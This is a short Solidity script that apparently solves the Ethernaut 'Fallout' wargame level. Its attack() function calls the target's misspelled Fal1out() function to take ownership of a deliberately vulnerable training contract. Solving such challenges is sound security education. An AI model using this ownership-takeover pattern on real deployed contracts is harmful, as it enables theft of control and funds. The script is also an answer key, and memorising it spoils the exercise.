// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Fallout} from "~/Fallout.sol";

contract Check is CheckScript("FALLOUT") {}

contract Solve is SolveScript("FALLOUT") {
    Fallout target;

    constructor() {
        target = Fallout(instance);
    }

    function attack() public override {
        target.Fal1out();
    }
}
